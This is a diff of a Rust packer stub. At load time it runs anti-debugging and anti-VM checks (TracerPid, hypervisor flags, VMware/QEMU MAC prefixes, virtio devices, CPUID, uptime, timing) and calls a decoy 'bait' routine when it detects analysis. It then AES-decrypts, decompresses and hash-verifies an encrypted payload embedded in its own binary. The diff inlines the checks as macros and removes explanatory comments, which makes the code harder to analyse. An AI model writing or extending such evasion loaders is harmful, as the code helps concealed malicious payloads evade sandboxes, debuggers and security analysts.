@@ -20,133 +20,155 @@ const BIGMONKE_BYTES: &[u8] = include_bytes!("BIGMONKE");
 
 const BLAKE3_SIZE: usize = 32;
 
-fn is_being_traced() -> bool {
-    let mut file = match File::open("/proc/self/status") {
-        Ok(f) => f,
-        Err(_) => return true,
-    };
-    let mut contents = String::new();
-    if file.read_to_string(&mut contents).is_err() {
-        return true;
-    }
-
-    for line in contents.lines() {
-        if line.starts_with("TracerPid:") {
-            let parts: Vec<&str> = line.split_whitespace().collect();
-            if parts.len() >= 2 {
-                let tracer_pid = parts[1].parse::<i32>().unwrap_or(0);
-                return tracer_pid != 0;
+macro_rules! is_being_traced {
+    () => {{
+        let result = loop {
+            let mut file = match File::open("/proc/self/status") {
+                Ok(f) => f,
+                Err(_) => break true,
+            };
+            let mut contents = String::new();
+            if file.read_to_string(&mut contents).is_err() {
+                break true;
             }
-        }
-    }
-    false
-}
-
-fn check_hypervisor_flag() -> bool {
-    if let Ok(mut file) = File::open("/proc/cpuinfo") {
-        let mut contents = String::new();
-        if file.read_to_string(&mut contents).is_ok() {
+            let mut traced = false;
             for line in contents.lines() {
-                if line.starts_with("flags") && line.contains("hypervisor") {
-                    return true;
+                if line.starts_with("TracerPid:") {
+                    let parts: Vec<&str> = line.split_whitespace().collect();
+                    if parts.len() >= 2 {
+                        let tracer_pid = parts[1].parse::<i32>().unwrap_or(0);
+                        traced = tracer_pid != 0;
+                        break;
+                    }
                 }
             }
-        }
-    }
-    false
+            break traced;
+        };
+        result
+    }};
 }
 
-fn check_vm_files() -> bool {
-    let vm_files = [
-        "/usr/lib/vmware-tools",
-        "/dev/virtio-ports",
-    ];
-    for file in vm_files.iter() {
-        if Path::new(file).exists() {
-            return true;
-        }
-    }
-    false
-}
-
-fn check_mac_address() -> bool {
-    let vm_mac_prefixes = [
-        "00:05:69", // VMware
-        "00:0C:29", // VMware
-        "00:50:56", // VMware
-        "52:54:00", // QEMU/KVM
-    ];
-    if let Ok(entries) = fs::read_dir("/sys/class/net") {
-        for entry in entries.flatten() {
-            let path = entry.path().join("address");
-            if let Ok(mac) = fs::read_to_string(&path) {
-                let mac = mac.trim().to_uppercase();
-                for prefix in vm_mac_prefixes.iter() {
-                    if mac.starts_with(prefix) {
+macro_rules! check_hypervisor_flag {
+    () => {{
+        if let Ok(mut file) = File::open("/proc/cpuinfo") {
+            let mut contents = String::new();
+            if file.read_to_string(&mut contents).is_ok() {
+                for line in contents.lines() {
+                    if line.starts_with("flags") && line.contains("hypervisor") {
                         return true;
                     }
                 }
             }
         }
-    }
-    false
+        false
+    }};
 }
 
-fn check_disk_size() -> bool {
-    if let Ok(mut file) = File::open("/proc/partitions") {
-        let mut contents = String::new();
-        if file.read_to_string(&mut contents).is_ok() {
-            for line in contents.lines() {
-                if line.contains("vda") || line.contains("xvda") {
-                    return true;
+macro_rules! check_vm_files {
+    () => {{
+        let vm_files = [
+            "/usr/lib/vmware-tools",
+            "/dev/virtio-ports",
+        ];
+        for file in vm_files.iter() {
+            if Path::new(file).exists() {
+                return true;
+            }
+        }
+        false
+    }};
+}
+
+macro_rules! check_mac_address {
+    () => {{
+        let vm_mac_prefixes = [
+            "00:05:69", // VMware
+            "00:0C:29", // VMware
+            "00:50:56", // VMware
+            "52:54:00", // QEMU/KVM
+        ];
+        if let Ok(entries) = fs::read_dir("/sys/class/net") {
+            for entry in entries.flatten() {
+                let path = entry.path().join("address");
+                if let Ok(mac) = fs::read_to_string(&path) {
+                    let mac = mac.trim().to_uppercase();
+                    for prefix in vm_mac_prefixes.iter() {
+                        if mac.starts_with(prefix) {
+                            return true;
+                        }
+                    }
                 }
             }
         }
-    }
-    false
+        false
+    }};
 }
 
-fn check_uptime() -> bool {
-    if let Ok(mut file) = File::open("/proc/uptime") {
-        let mut contents = String::new();
-        if file.read_to_string(&mut contents).is_ok() {
-            if let Some(uptime_str) = contents.split_whitespace().next() {
-                if let Ok(uptime) = uptime_str.parse::<f64>() {
-                    return uptime < 60.0;
+macro_rules! check_disk_size {
+    () => {{
+        if let Ok(mut file) = File::open("/proc/partitions") {
+            let mut contents = String::new();
+            if file.read_to_string(&mut contents).is_ok() {
+                for line in contents.lines() {
+                    if line.contains("vda") || line.contains("xvda") {
+                        return true;
+                    }
                 }
             }
         }
-    }
-    false
+        false
+    }};
 }
 
-fn check_cpuid() -> bool {
-    let cpuid = CpuId::new();
-    cpuid.get_hypervisor_info().is_some()
+macro_rules! check_uptime {
+    () => {{
+        if let Ok(mut file) = File::open("/proc/uptime") {
+            let mut contents = String::new();
+            if file.read_to_string(&mut contents).is_ok() {
+                if let Some(uptime_str) = contents.split_whitespace().next() {
+                    if let Ok(uptime) = uptime_str.parse::<f64>() {
+                        return uptime < 60.0;
+                    }
+                }
+            }
+        }
+        false
+    }};
 }
 
-fn check_tracing() -> bool {
-    is_being_traced()
+macro_rules! check_cpuid {
+    () => {{
+        let cpuid = CpuId::new();
+        cpuid.get_hypervisor_info().is_some()
+    }};
 }
 
-fn check_timing() -> bool {
-    let t1 = Instant::now();
-    let t2 = Instant::now();
-    t2.duration_since(t1) > Duration::from_millis(500)
+macro_rules! check_tracing {
+    () => {
+        is_being_traced!()
+    };
+}
+
+macro_rules! check_timing {
+    () => {{
+        let t1 = Instant::now();
+        let t2 = Instant::now();
+        t2.duration_since(t1) > Duration::from_millis(500)
+    }};
 }
 
 #[cfg(not(test))]
 #[ctor]
 fn vm_detection() {
     let checks: Vec<(fn() -> bool, f32)> = vec![
-        (check_hypervisor_flag, 2.0),
-        (check_vm_files, 1.0),
-        (check_mac_address, 1.0),
-        (check_disk_size, 1.0),
-        (check_uptime, 0.5),
-        (check_cpuid, 2.0),
-        (check_tracing, 2.0),
-        (check_timing, 1.0),
+        (|| check_hypervisor_flag!(), 2.0),
+        (|| check_vm_files!(), 1.0),
+        (|| check_mac_address!(), 1.0),
+        (|| check_disk_size!(), 1.0),
+        (|| check_uptime!(), 0.5),
+        (|| check_cpuid!(), 2.0),
+        (|| check_tracing!(), 2.0),
+        (|| check_timing!(), 1.0),
     ];
 
     let mut score = 0.0;
@@ -208,7 +230,7 @@ fn bait() {
 #[cfg(not(test))]
 macro_rules! is_traced {
     () => {
-        if is_being_traced() {
+        if is_being_traced!() {
             // eprintln!("Tracing detected");
             bait();
         }
@@ -218,19 +240,23 @@ macro_rules! is_traced {
 #[cfg(not(test))]
 macro_rules! timecheck {
     () => {
-        is_traced!();
-        let t1 = Instant::now();
-        let t2 = Instant::now();
-        if t2.duration_since(t1) > Duration::from_millis(500) {
+        {
+            is_traced!();
+            let t1 = Instant::now();
+            let t2 = Instant::now();
+            if t2.duration_since(t1) > Duration::from_millis(500) {
             // eprintln!("Timing check failed");
-            bait();
+                bait();
+            }
         }
     };
     ($beg:expr, $delay:expr) => {
-        is_traced!();
-        if Instant::now().duration_since($beg) > $delay {
+        {
+            is_traced!();
+            if Instant::now().duration_since($beg) > $delay {
             // eprintln!("Timing check with delay failed");
-            bait();
+                bait();
+            }
         }
     };
 }
@@ -263,7 +289,6 @@ fn init_checksum_validation() {
         }
     };
 
-    // Read the final checksum (last 32 bytes for Blake3)
     if file.seek(SeekFrom::End(-(BLAKE3_SIZE as i64))).is_err() {
         // eprintln!("Failed to seek to final hash");
         bait();
@@ -276,7 +301,6 @@ fn init_checksum_validation() {
         return;
     }
 
-    // Check binary integrity (excluding the final hash)
     let binary_size = total_size - (BLAKE3_SIZE as u64);
     if file.seek(SeekFrom::Start(0)).is_err() {
         // eprintln!("Failed to seek to start of binary");
@@ -354,7 +378,6 @@ fn main() {
     // 8 (encrypted_size) + 8 (a1_size) + 8 (a2_size) + 8 (white_data_size) + 8 (decompressed_size)
     const SIZE_FIELDS_SIZE: usize = 40;
 
-    // Read all sizes in one go (they're before the checksums)
     if file.seek(SeekFrom::End(-((BLAKE3_SIZE + CHECKSUMS_SIZE + SIZE_FIELDS_SIZE) as i64))).is_err() {
         // eprintln!("Failed to seek to sizes");
         bait();
@@ -408,7 +431,6 @@ fn main() {
     let start_a1 = start_a2 - size_a1;
     let start_encrypted_payload = start_a1 - size_encrypted_payload;
 
-    // Check offsets
     if start_encrypted_payload >= total_size || start_a1 >= total_size ||
        start_a2 >= total_size || start_white_data >= total_size {
         // eprintln!("Invalid offsets");
@@ -416,7 +438,6 @@ fn main() {
         return;
     }
 
-    // Read sections
     if file.seek(SeekFrom::Start(start_encrypted_payload)).is_err() {
         // eprintln!("Failed to seek to encrypted payload");
         bait();
@@ -508,14 +529,12 @@ fn main() {
         }
     }
 
-    // AES key checksum
     if !validate_blake3(&aes_key, &aes_key_hash) {
         // eprintln!("ERROR: AES key verification failed");
         bait();
         return;
     }
 
-    // Decrypt packed binary
     let aes = AES128::new(&aes_key);
     let padded_compressed_data = (aes.decrypt)(&aes, &encrypted_payload);
     let compressed_data = match aes::unpad_pkcs7(&padded_compressed_data) {
@@ -527,14 +546,12 @@ fn main() {
         }
     };
 
-    // Compressed data checksum
     if !validate_blake3(&compressed_data, &compressed_hash) {
         // eprintln!("ERROR: Compressed data verification failed");
         bait();
         return;
     }
 
-    // Decompress
     let decompressed_data = match decompress(&compressed_data, decompressed_size as usize) {
         Ok(data) => data,
         Err(_) => {
@@ -544,7 +561,6 @@ fn main() {
         }
     };
 
-    // Decompressed binary checksum
     if !validate_blake3(&decompressed_data, &original_hash) {
         // eprintln!("ERROR: Original binary verification failed");
         bait();
@@ -601,6 +617,6 @@ mod tests {
 
     #[test]
     fn test_not_traced() {
-        assert_eq!(is_being_traced(), false);
+        assert_eq!(is_being_traced!(), false);
     }
 }
